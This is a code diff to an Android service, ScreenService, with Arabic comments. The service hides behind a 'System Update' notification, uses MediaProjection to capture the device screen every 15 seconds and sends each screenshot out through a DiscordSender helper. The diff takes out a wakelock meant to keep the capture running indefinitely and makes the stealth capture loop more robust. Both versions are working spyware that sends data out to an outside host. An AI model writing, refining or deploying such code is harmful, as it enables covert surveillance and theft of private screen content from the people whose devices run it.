@@ -13,7 +13,6 @@ import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.Handler;
 import android.os.IBinder;
-import android.os.PowerManager;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 import androidx.core.app.NotificationCompat;
@@ -26,29 +25,29 @@ public class ScreenService extends Service {
     private VirtualDisplay virtualDisplay;
     private ImageReader imageReader;
     private Handler handler = new Handler();
-    private PowerManager.WakeLock wakeLock;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // منع المعالج من النوم (للبقاء شغال للأبد)
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:MonitorLock");
-        wakeLock.acquire();
-
-        // إشعار الخدمة الأمامية
-        String channelId = "sys_update";
+        // تشغيل الإشعار فوراً لمنع كراش الخدمة (Timeout)
+        String channelId = "system_service";
         NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
         getSystemService(NotificationManager.class).createNotificationChannel(channel);
-        startForeground(1, new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update Running")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details).build());
+        
+        Notification notification = new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("System Update")
+                .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                .build();
 
-        int resCode = intent.getIntExtra("resCode", -1);
-        Intent resData = intent.getParcelableExtra("resData");
-        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        mediaProjection = mpm.getMediaProjection(resCode, resData);
+        startForeground(1, notification);
 
-        startCapture();
+        if (intent != null && intent.hasExtra("resData")) {
+            int resCode = intent.getIntExtra("resCode", -1);
+            Intent resData = intent.getParcelableExtra("resData");
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            mediaProjection = mpm.getMediaProjection(resCode, resData);
+            startCapture();
+        }
+
         return START_STICKY;
     }
 
@@ -57,32 +56,33 @@ public class ScreenService extends Service {
         WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         wm.getDefaultDisplay().getMetrics(metrics);
         imageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("Cap", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
+        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCap", 
+                metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
-                capture();
-                handler.postDelayed(this, 15000); // صورة كل 15 ثانية
+                captureAndSend();
+                handler.postDelayed(this, 15000);
             }
         }, 5000);
     }
 
-    private void capture() {
-        Image image = imageReader.acquireLatestImage();
-        if (image != null) {
-            Image.Plane[] planes = image.getPlanes();
-            ByteBuffer buffer = planes[0].getBuffer();
-            Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
-            bitmap.copyPixelsFromBuffer(buffer);
-            image.close();
-            File file = new File(getCacheDir(), "s.png");
-            try (FileOutputStream out = new FileOutputStream(file)) {
-                bitmap.compress(Bitmap.CompressFormat.PNG, 50, out);
-                DiscordSender.sendPhoto(file);
-            } catch (Exception e) {}
-        }
+    private void captureAndSend() {
+        try (Image image = imageReader.acquireLatestImage()) {
+            if (image != null) {
+                Image.Plane[] planes = image.getPlanes();
+                ByteBuffer buffer = planes[0].getBuffer();
+                Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
+                bitmap.copyPixelsFromBuffer(buffer);
+                File file = new File(getCacheDir(), "s.png");
+                try (FileOutputStream out = new FileOutputStream(file)) {
+                    bitmap.compress(Bitmap.CompressFormat.PNG, 50, out);
+                    DiscordSender.sendPhoto(file);
+                } catch (Exception e) {}
+            }
+        } catch (Exception e) {}
     }
 
     @Override public IBinder onBind(Intent intent) { return null; }
-    @Override public void onDestroy() { if (wakeLock != null) wakeLock.release(); super.onDestroy(); }
 }
